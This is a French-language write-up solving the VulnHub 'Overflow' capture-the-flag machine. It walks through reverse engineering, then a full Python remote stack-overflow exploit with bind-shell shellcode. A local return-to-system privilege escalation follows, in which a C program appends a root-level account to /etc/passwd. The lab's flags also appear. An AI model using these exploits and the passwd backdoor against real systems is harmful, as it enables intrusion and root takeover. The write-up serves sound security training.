---
title: "Solution du CTF Overflow de VulnHub"
tags: [CTF, binary exploitation]
---

[Overflow](https://vulnhub.com/entry/overflow-1,300/) est un CTF proposé sur *VulnHub* qui porte bien son nom : un stack overflow à exploiter à distance pour le premier accès et un buffer overflow local pour passer root. Dans les deux cas l'exploitation est facilitée par quelques aides mises à disposition par l'auteur du CTF.

## REmote

Sur le port 80 de la VM on trouve un lien vers un binaire de binaire de 15Ko.

```
$ file vulnserver 
vulnserver: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=22c480f83765e0d4ca860fe9469074ba8f17295c, not stripped
$ checksec --file vulnserver
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   vulnserver
```

Je le télécharge et l'ouvre dans l'outil de reverse-engineering `Cutter`.

Quand on regarde la liste des imports, on remarque tout de suite une utilisation de `strcpy` que `Cutter` marque à *Non sûr*.

Je vois aussi dans les fonctions présentes dans le binaire une qui s'appelle `jmpesp` et qui contient une instruction utile :

```nasm
jmpesp ();
0x0804928d      push    ebp
0x0804928e      mov     ebp, esp
0x08049290      call    __x86.get_pc_thunk.ax ; sym.__x86.get_pc_thunk.ax
0x08049295      add     eax, 0x2d6b
0x0804929a      jmp     esp
0x0804929c      nop
0x0804929d      pop     ebp
0x0804929e      ret
```

A part ça on voit que le programme écoute sur le port 1337 :

```nasm
0x08049324      push    0x539      ; 1337
0x08049329      call    htons      ; sym.imp.htons
0x0804932e      add     esp, 0x10
0x08049331      mov     word [address + 0x2], ax
0x08049335      sub     esp, 0xc
0x08049338      lea     eax, [ebx - 0x1fc3]
0x0804933e      push    eax
0x0804933f      call    inet_addr  ; sym.imp.inet_addr
0x08049344      add     esp, 0x10
0x08049347      mov     dword [var_3ch], eax
0x0804934a      sub     esp, 4
0x0804934d      push    0x10       ; 16 ; socklen_t address_len
0x0804934f      lea     eax, [address]
0x08049352      push    eax        ; struct sockaddr *address
0x08049353      push    dword [socket] ; int socket
0x08049356      call    bind       ; sym.imp.bind ; int bind(int socket, struct sockaddr *address, socklen_t address_len)
```

Qu'il attend 1024 octets maximum en lecture :

```nasm
0x0804945a      push    0          ; int flags
0x0804945c      push    0x400      ; 1024 ; size_t length
0x08049461      lea     eax, [buffer]
0x08049467      push    eax        ; void *buffer
0x08049468      push    dword [fd] ; int socket
0x0804946b      call    recv       ; sym.imp.recv ; ssize_t recv(int socket, void *buffer, size_t length, int flags)
```

Alors que la fonction qui se voit passer le buffer en paramètre va tenter de le recopier dans sa stack frame de 36 octets :

```nasm
handleCommand (const char *src);
; var char *dest @ stack - 0x2c
; var int32_t var_8h @ stack - 0x8
; arg const char *src @ stack + 0x4
0x08049262      push    ebp
0x08049263      mov     ebp, esp
0x08049265      push    ebx
0x08049266      sub     esp, 0x24
0x08049269      call    __x86.get_pc_thunk.ax ; sym.__x86.get_pc_thunk.ax
0x0804926e      add     eax, 0x2d92
0x08049273      sub     esp, 8
0x08049276      push    dword [src] ; const char *src
0x08049279      lea     edx, [dest]
0x0804927c      push    edx        ; char *dest
0x0804927d      mov     ebx, eax
0x0804927f      call    strcpy     ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
0x08049284      add     esp, 0x10
0x08049287      nop
0x08049288      mov     ebx, dword [var_8h]
0x0804928b      leave
0x0804928c      ret
```

Point important : pour parvenir jusqu'à `handleCommand` il faut passer un `strncmp` :

```nasm
0x08049476      push    9          ; 9 ; size_t n
0x08049478      lea     eax, [buffer]
0x0804947e      push    eax        ; const char *s2
0x0804947f      lea     eax, [ebx - 0x1f55]
0x08049485      push    eax        ; const char *s1
0x08049486      call    strncmp    ; sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
```

J'ai lancé le débogueur pour voir ce qui était attendu :

```
[-------------------------------------code-------------------------------------]
   0x804947e <main+479>:        push   eax
   0x804947f <main+480>:        lea    eax,[ebx-0x1f55]
   0x8049485 <main+486>:        push   eax
=> 0x8049486 <main+487>:        call   0x8049130 <strncmp@plt>
   0x804948b <main+492>:        add    esp,0x10
   0x804948e <main+495>:        test   eax,eax
   0x8049490 <main+497>:        jne    0x80494c0 <main+545>
   0x8049492 <main+499>:        sub    esp,0xc
Guessed arguments:
arg[0]: 0x804a0ab ("OVERFLOW ")
arg[1]: 0xffffc7ac ("aaaabaaacaaadaaae"...)
arg[2]: 0x9 ('\t')
```

J'envoie une chaine cyclique au binaire avec le préfixe attendu et je break sur l'instruction `ret` de la fonction :

```
[----------------------------------registers-----------------------------------]
EAX: 0xffffc760 ("OVERFLOW aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaa"...)
EBX: 0x61616861 ('ahaa')
ECX: 0xffffcba0 ("kbaakcaakdaa\020")
EDX: 0xffffcb54 ("kbaakcaakdaa\020")
ESI: 0xc75c 
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x61616961 ('aiaa')
ESP: 0xffffc78c ("ajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaa"...)
EIP: 0x804928c (<handleCommand+42>:     ret)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049287 <handleCommand+37>:        nop
   0x8049288 <handleCommand+38>:        mov    ebx,DWORD PTR [ebp-0x4]
   0x804928b <handleCommand+41>:        leave  
=> 0x804928c <handleCommand+42>:        ret    
   0x804928d <jmpesp>:  push   ebp
   0x804928e <jmpesp+1>:        mov    ebp,esp
   0x8049290 <jmpesp+3>:        call   0x80494dc <__x86.get_pc_thunk.ax>
   0x8049295 <jmpesp+8>:        add    eax,0x2d6b
[------------------------------------stack-------------------------------------]
```

Je détermine que `eip` est pris à l'offset 35 de notre chaine (sans compter le préfixe `OVERFLOW `).

J'ai écrit l'exploit suivant :

```python
from struct import pack
from socket import socket

shellcode = (
    # Linux/x86 - Bind (5074/TCP) Shell Shellcode (92 bytes)
    # https://www.exploit-db.com/shellcodes/13448
    b"\x31\xc0"                 # xorl          %eax,%eax
    b"\x50"                             # pushl %eax
    b"\x40"                             # incl          %eax
    b"\x89\xc3"                 # movl          %eax,%ebx
    b"\x50"                             # pushl %eax
    b"\x40"                             # incl          %eax
    b"\x50"                             # pushl %eax
    b"\x89\xe1"                 # movl          %esp,%ecx
    b"\xb0\x66"                 # movb          $0x66,%al
    b"\xcd\x80"                 # int           $0x80
    b"\x31\xd2"                 # xorl          %edx,%edx
    b"\x52"                             # pushl %edx
    b"\x66\x68\x13\xd2"         # pushw $0xd213
    b"\x43"                             # incl          %ebx
    b"\x66\x53"                 # pushw %bx
    b"\x89\xe1"                 # movl          %esp,%ecx
    b"\x6a\x10"                 # pushl $0x10
    b"\x51"                             # pushl %ecx
    b"\x50"                             # pushl %eax
    b"\x89\xe1"                 # movl          %esp,%ecx
    b"\xb0\x66"                 # movb          $0x66,%al
    b"\xcd\x80"                 # int           $0x80
    b"\x40"                             # incl          %eax
    b"\x89\x44\x24\x04"         # movl          %eax,0x4(%esp,1)
    b"\x43"                             # incl          %ebx
    b"\x43"                             # incl          %ebx
    b"\xb0\x66"                 # movb          $0x66,%al
    b"\xcd\x80"                 # int           $0x80
    b"\x83\xc4\x0c"                     # addl          $0xc,%esp
    b"\x52"                             # pushl %edx
    b"\x52"                             # pushl %edx
    b"\x43"                             # incl          %ebx
    b"\xb0\x66"                 # movb          $0x66,%al
    b"\xcd\x80"                 # int           $0x80
    b"\x93"                             # xchgl %eax,%ebx
    b"\x89\xd1"                 # movl          %edx,%ecx
    b"\xb0\x3f"                 # movb          $0x3f,%al
    b"\xcd\x80"                 # int           $0x80
    b"\x41"                             # incl          %ecx
    b"\x80\xf9\x03"                     # cmpb          $0x3,%cl
    b"\x75\xf6"                 # jnz           <shellcode+0x40>
    b"\x52"                             # pushl %edx
    b"\x68\x6e\x2f\x73\x68"             # pushl $0x68732f6e
    b"\x68\x2f\x2f\x62\x69"             # pushl $0x69622f2f
    b"\x89\xe3"                 # movl          %esp,%ebx
    b"\x52"                             # pushl %edx
    b"\x53"                             # pushl %ebx
    b"\x89\xe1"                 # movl          %esp,%ecx
    b"\xb0\x0b"                 # movb          $0xb,%al
    b"\xcd\x80"                 # int           $0x80
)
jmp_esp = 0x0804929a

buffer = b"OVERFLOW " + b"A" * 35 + pack("<I", jmp_esp) + shellcode + b"\n"
sock = socket()
sock.connect(("192.168.56.206", 1337))
sock.send(buffer)
sock.close()
```

L'avantage, c'est que la gestion des connexions dans le binaire se fait avec un `fork` préalable donc on n'a pas à utiliser un shellcode qui le fait.

On obtient notre premier shell.

```console
$ ncat 192.168.56.206 5074 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.206:5074.
id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
uname -a
Linux Overflow 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
```

## Password is too big

Je profite du shell pour rapatrier et exécuter un `reverse-ssh` en mode bind.

Je découvre alors un binaire setuid root dans le dossier de l'utilisateur :

```console
user@Overflow:/home/user$ ls
printauthlog  reverse-sshx86  user.txt  vulnserver
user@Overflow:/home/user$ cat user.txt 
8dd5b4a914ae5eb0d5f2d3176919a0ea
user@Overflow:/home/user$ ls -al printauthlog 
-rwsr-xr-x 1 root root 15504 Apr  1  2019 printauthlog
```

Exfiltrer ce fichier est un peu difficile, car aucun des outils habituels n'est présent (`nc`, `python`, `scp`, `ftp` sont aux abonnés absents).

J'ai procédé à un bête encodage base64 et recopie via le terminal, car le binaire une nouvelle fois de petite taille.

Au passage la stack est randomisée sur le système et cette fois NX est présent :

```console
$ checksec --file printauthlog 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   printauthlog
```

Mais comme le binaire a une fonction qui appelle `system`, ce dernier est présent dans les imports.

```nasm
shell (const char *string);
; var int32_t var_8h @ stack - 0x8
; arg const char *string @ stack + 0x4
0x080491a2      push    ebp
0x080491a3      mov     ebp, esp
0x080491a5      push    ebx
0x080491a6      sub     esp, 4
0x080491a9      call    __x86.get_pc_thunk.ax ; sym.__x86.get_pc_thunk.ax
0x080491ae      add     eax, 0x2e52
0x080491b3      sub     esp, 0xc
0x080491b6      push    dword [string] ; const char *string
0x080491b9      mov     ebx, eax
0x080491bb      call    system     ; sym.imp.system ; int system(const char *string)
0x080491c0      add     esp, 0x10
0x080491c3      nop
0x080491c4      mov     ebx, dword [var_8h]
0x080491c7      leave
0x080491c8      ret
```

Ce que fait le programme, c'est prendre un password sur la ligne de commande et appeler `checkPassword` qui est vulnérable :

```nasm
checkPassword (const char *src);
; var const char *s1 @ stack - 0x4d
; var int32_t var_49h @ stack - 0x49
; var int32_t var_45h @ stack - 0x45
; var char *dest @ stack - 0x44
; var int32_t var_8h @ stack - 0x8
; arg const char *src @ stack + 0x4
0x080491c9      push    ebp
0x080491ca      mov     ebp, esp
0x080491cc      push    ebx
0x080491cd      sub     esp, 0x54
0x080491d0      call    __x86.get_pc_thunk.bx ; sym.__x86.get_pc_thunk.bx
0x080491d5      add     ebx, 0x2e2b
0x080491db      mov     dword [s1], 0x64616564 ; 'dead'
0x080491e2      mov     dword [var_49h], 0x66656562 ; 'beef'
0x080491e9      mov     byte [var_45h], 0
0x080491ed      sub     esp, 8
0x080491f0      push    dword [src] ; const char *src
0x080491f3      lea     eax, [dest]
0x080491f6      push    eax        ; char *dest
0x080491f7      call    strcpy     ; sym.imp.strcpy ; char *strcpy(char *dest, const char *src)
0x080491fc      add     esp, 0x10
0x080491ff      sub     esp, 4
0x08049202      push    9          ; 9 ; size_t n
0x08049204      lea     eax, [dest]
0x08049207      push    eax        ; const char *s2
0x08049208      lea     eax, [s1]
0x0804920b      push    eax        ; const char *s1
0x0804920c      call    strncmp    ; sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
0x08049211      add     esp, 0x10
0x08049214      mov     ebx, dword [var_8h]
0x08049217      leave
0x08049218      ret
```

On a l'adresse de `system` mais maintenant il nous fait l'adresse d'une chaine à passer en argument.

Comme pour le [CTF Moee]({% link _posts/2022-01-30-Solution-du-CTF-Moee-de-VulnHub.md %}) il y a une chaine `zR` que je trouve dans une partie du binaire mappé en mémoire :

```
gdb-peda$ x/s 0x804b089
0x804b089:      "zR"
```

Je suppose qu'elle correspond à une instruction ASM standard, car je la croise assez souvent.

Il ne nous reste qu'à déterminer à quel offset on écrasera `eip` comme pour le précédent binaire :

```
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x61616170 ('paaa')
ECX: 0x61 ('a')
EDX: 0xffffc6ff ("deadbeef")
ESI: 0xffffc788 ("haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaad"...)
EDI: 0xffffc7d0 ("zaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad"...)
EBP: 0x61616171 ('qaaa')
ESP: 0xffffc74c ("raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaac"...)
EIP: 0x8049218 (<checkPassword+79>:     ret)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049211 <checkPassword+72>:        add    esp,0x10
   0x8049214 <checkPassword+75>:        mov    ebx,DWORD PTR [ebp-0x4]
   0x8049217 <checkPassword+78>:        leave  
=> 0x8049218 <checkPassword+79>:        ret    
   0x8049219 <main>:    lea    ecx,[esp+0x4]
   0x804921d <main+4>:  and    esp,0xfffffff0
   0x8049220 <main+7>:  push   DWORD PTR [ecx-0x4]
   0x8049223 <main+10>: push   ebp
[------------------------------------stack-------------------------------------]
```

Ici on voit que le début de la stack contient `raaa` qui écrasera `eip` et correspond à l'offset 68 de la chaine que j'ai passé en argument.

Comme Python n'est pas présent sur le système, j'ai eu recours à perl pour passer le buffer en paramètre. Mon programme `zR` qui est appelé va rajouter un utilisateur équivalent à `root` dont le mot de passe est `hello` :

```console
user@Overflow:/home/user$ cat > zR.c << EOF
> #include <unistd.h>
> #include <stdlib.h>
> #include <string.h>
> #include <stdio.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> 
> int main(void) {
>   FILE * fd;
>   fd = fopen("/etc/passwd", "a");
>   fputs("devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh\n", fd);
>   fclose(fd);
> }
> EOF
user@Overflow:/home/user$ gcc -o zR zR.c
user@Overflow:/home/user$ export PATH=.:$PATH
user@Overflow:/home/user$ ./printauthlog `perl -e 'print "A"x68;print "\x60\x90\x04\x08AAAA\x89\xb0\x04\x08"'`
Segmentation fault
user@Overflow:/home/user$ tail /etc/passwd
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
avahi-autoipd:x:105:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh
user@Overflow:/home/user$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
dfd0ac5a9cb9220d0d34322878d9cd7b
```

Le buffer passé en argument contient les 68 caractères avant EIP, l'adresse de la fonction `system` importée, une adresse de retour invalide (qui fait crasher le programme) puis l'adresse de `zR`.
